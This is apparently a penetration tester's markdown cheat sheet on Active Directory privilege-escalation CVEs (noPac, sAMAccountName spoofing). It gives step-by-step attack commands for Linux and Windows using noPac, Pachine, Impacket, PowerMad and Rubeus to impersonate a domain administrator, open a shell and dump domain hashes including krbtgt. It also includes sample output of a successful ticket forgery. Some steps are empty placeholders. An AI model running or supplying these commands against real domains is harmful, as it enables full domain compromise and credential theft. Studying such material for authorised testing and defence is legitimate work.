<!---------------------------------------------------------------------------------
Copyright: (c) BLS OPS LLC.
This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, version 3.
This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
GNU General Public License for more details.
You should have received a copy of the GNU General Public License
along with this program. If not, see <https://www.gnu.org/licenses/>.
--------------------------------------------------------------------------------->
# Active Directory CVEs
### Tags
<details><summary>Tags (Click to expand)</summary><p>

Environment

		#@active #@directory #@activedirectory #@microsoft

Context

		#@samaccountnamespoof #@samaccount #@nopac #@zerologon #@zero #@logon

Tools

		#@pachine #@nopac #@rubeus #@powermad 

</p></details>

### References

### Example Attacks
#### From a Linux Machine
* No-PAC
	* <details><summary>Ridter GitHub: noPac <br />[https://github.com/Ridter/noPac](https://github.com/Ridter/noPac) (Click to expand)</summary><p>
		* References
			* Based on sam-the-admin -<br />[https://github.com/WazeHell/sam-the-admin](https://github.com/WazeHell/sam-the-admin)
			* noPac Scanner and Exploiter -<br />[https://github.com/cube0x0/noPac](https://github.com/cube0x0/noPac)
			* noPac Exploiter (and scanner?) -<br />[https://github.com/Ridter/noPac](https://github.com/Ridter/noPac)
		* Examples
			* GetST

					python noPac.py $DOMAIN/$DOMAIN_USER:$PASSWORD -dc-ip $DC_IP
			* Auto get shell

					python noPac.py $DOMAIN/$DOMAIN_USER:$PASSWORD -dc-ip $DC_IP -dc-host lab2012 -shell --impersonate administrator
			* Dump hash

					python noPac.py $DOMAIN/$DOMAIN_USER:$PASSWORD -dc-ip $DC_IP -dc-host lab2012 --impersonate administrator -dump
					python noPac.py $DOMAIN/$DOMAIN_USER:$PASSWORD -dc-ip $DC_IP -dc-host lab2012 --impersonate administrator -dump -just-dc-user $DOMAIN/krbtgt
	<details><summary>ly4k GitHub: Pachine (Click to expand)</summary><p>
		* Example

				python pachine.py -dc-host $DOMAIN_CONTROLLER -impersonate Administrator -spn dns/$DOMAIN_CONTROLLER $DOMAIN/$DOMAIN_USER:$PASSWORD -dc-ip $DC_IP
			* SPNs
				* cifs
				* DNS
				* Host(?)
				* LDAP
				* RPC
		* Sample Output

				(Pachine-AJVASppL) root@ubuntu:~/Tools/Pachine# python pachine.py -dc-host dc01.securelab.local -impersonate Administrator -spn dns/dc01.securelab.local 'securelab.local/domain_user:P@ssw0rd' -dc-ip $DC_IP
				Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

				[*] Machine account dc01 already exists. Trying to change password.
				[*] Changed password of dc01 to jjHjmJ0LbD7knDHCKENUPlXPDQr8WSVN.
				[*] Got TGT for dc01@SECURELAB.LOCAL
				[*] Changed machine account name from dc01 to DESKTOP-7UYAO157$
				[*] Requesting S4U2self
				[*] Got TGS for Administrator@securelab.local for dc01@SECURELAB.LOCAL
				[*] Changing sname from dc01@SECURELAB.LOCAL to dns/dc01.securelab.local@SECURELAB.LOCAL
				[*] Changed machine account name from DESKTOP-7UYAO157$ to dc01
				[*] Saving ticket in Administrator@securelab.local.ccache
	* WazeHell Github: sam-the-admin-<br />[https://github.com/WazeHell/sam-the-admin](https://github.com/WazeHell/sam-the-admin)
* samAccountnamespoofing
	* <details><summary>References (Click to expand)</summary><p>
		* [https://exploit.ph/cve-2021-42287-cve-2021-42278-weaponisation.html](https://exploit.ph/cve-2021-42287-cve-2021-42278-weaponisation.html)
		* [https://twitter.com/snovvcrash/status/1469316932180619268?t=IPm4pUbUvHVwQrZu9F3xrA](https://twitter.com/snovvcrash/status/1469316932180619268?t=IPm4pUbUvHVwQrZu9F3xrA)
		* [https://cloudbrothers.info/en/exploit-kerberos-samaccountname-spoofing/](https://cloudbrothers.info/en/exploit-kerberos-samaccountname-spoofing/)
	* <details><summary>Requirements (Click to expand)</summary><p>
		* At least 1 DC not patched with either `KB5008380` or `KB5008602`
		* Any valid domain user account
		* Machine Account Quota (MAQ) above 0
	* <details><summary>Process (Click to expand)</summary><p>
		1. Check if exploitable
			* Recommended: 

					.
		1. Create Machine Account
			* Recommended: impacket

					addcomputer.py -computer-name  anotherFakeMachine -computer-pass 'P@ssw0rd' -dc-ip $DC_IP -dc-host dc0.lab.local lab.local/first.lastname:'PASSWORD'
		1. Clear SPNs
			* Recommended: 

					.
		1. Change Machine Account samaccountname
			* Recommended: snovvcrash "Python setter for property sAMAccountName" [https://gist.github.com/snovvcrash/3bf1a771ea6b376d374facffa9e43383](https://gist.github.com/snovvcrash/3bf1a771ea6b376d374facffa9e43383)

					./renameMachine.py $DOMAIN/first.lastname:'PASSWORD' -dc-ip $DC_IP -current-name 'anotherFakeMachine$' -new-name dc0
		1. Request TGT
			* Recommended:

					getTGT.py $DOMAIN/DC0:'PASSWORD' -dc-ip $DC_IP
		1. Change Machine Account samaccountname
			* Recommended: snovvcrash "Python setter for property sAMAccountName" [https://gist.github.com/snovvcrash/3bf1a771ea6b376d374facffa9e43383](https://gist.github.com/snovvcrash/3bf1a771ea6b376d374facffa9e43383)

					./renameMachine.py $DOMAIN/first.lastname:'PASSWORD' -dc-ip $DC_IP -current-name 'dc0' -new-name 'anotherFakeMachine$'
		1. Impersonate

					export KRB5CCNAME=~/filelocation/DC0.ccache
				* `DC0.ccache` is from `getTGT.py`

						python3 examples/getST.py -spn cifs/$DOMAIN_CONTROLLER $DOMAIN/dc0 -k -no-pass -dc-ip $DC_IP -impersonate Administrator -self
		1. DCSync with the collected ccache (`Administrator.ccache`)
			* Recommended: Impacket

					KRB5CCNAME=Administrator.ccache secretsdump.py -k -no-pass $DOMAIN_CONTROLLER -just-dc


#### From a Windows Machine
##### Local (Domain Joined)
* No-PAC
	<details><summary>Process (Click to expand)</summary><p>(OpSec?) noPac Scanner and Exploiter -<br />[https://github.com/ricardojba/noPac](https://github.com/ricardojba/noPac)
		* Examples

				.\noPac.exe scan -domain lab.local -user <domaun_user> -pass <password>
* samAccountnamespoofing
	* <details><summary>References (Click to expand)</summary><p>
		* [https://exploit.ph/cve-2021-42287-cve-2021-42278-weaponisation.html](https://exploit.ph/cve-2021-42287-cve-2021-42278-weaponisation.html)
		* [https://twitter.com/snovvcrash/status/1469316932180619268?t=IPm4pUbUvHVwQrZu9F3xrA](https://twitter.com/snovvcrash/status/1469316932180619268?t=IPm4pUbUvHVwQrZu9F3xrA)
		* [https://cloudbrothers.info/en/exploit-kerberos-samaccountname-spoofing/](https://cloudbrothers.info/en/exploit-kerberos-samaccountname-spoofing/)
	* <details><summary>Requirements (Click to expand)</summary><p>
		* At least 1 DC not patched with either `KB5008380` or `KB5008602`
		* Any valid domain user account
		* Machine Account Quota (MAQ) above 0
	<details><summary>Process (Click to expand)</summary><p>
		1. Check if exploitable
			* Check the `SeMachineAccountPrivilege` which is granted to Authenticated Users by default:
				* Recommended: 

						.
		1. Create Machine Account
			* Recommended: PowerMad -<br />[https://github.com/Kevin-Robertson/Powermad](https://github.com/Kevin-Robertson/Powermad)

					New-MachineAccount -MachineAccount TestSPN -Domain internal.zeroday.lab -DomainController idc1.internal.zeroday.lab -Verbose
		1. Clear SPNs
			* Recommended: PowerSploit/PowerView -<br />[https://github.com/ZeroDayLab/PowerSploit/blob/master/Recon/PowerView.ps1](https://github.com/ZeroDayLab/PowerSploit/blob/master/Recon/PowerView.ps1)

					Set-DomainObject "CN=TestSPN,CN=Computers,DC=internal,DC=zeroday,DC=lab" -Clear 'serviceprincipalname' -Verbose
		1. Change Machine Account samaccountname
			* Recommended: PowerMad -<br />[https://github.com/Kevin-Robertson/Powermad](https://github.com/Kevin-Robertson/Powermad)

					Set-MachineAccountAttribute -MachineAccount TestSPN -Value "IDC1" -Attribute samaccountname -Verbose
		1. Request TGT
			* Recommended: Rubeus.exe

					.\Rubeus.exe asktgt /user:IDC1 /password:Password1 /domain:internal.zeroday.lab /dc:idc1.internal.zeroday.lab /nowrap
		1. Change Machine Account samaccountname
			* Recommended: PowerMad -<br />[https://github.com/Kevin-Robertson/Powermad](https://github.com/Kevin-Robertson/Powermad)

					Set-MachineAccountAttribute -MachineAccount TestSPN -Value "TestSPN" -Attribute samaccountname -Verbose
		1. Request S4U2self
			* Recommended: Rubeus.exe

					.\Rubeus.exe s4u /impersonateuser:Administrator /nowrap /dc:idc1.internal.zeroday.lab /self /altservice:LDAP/IDC1.internal.zeroday.lab /ptt /ticket:[TGT]

##### Remote

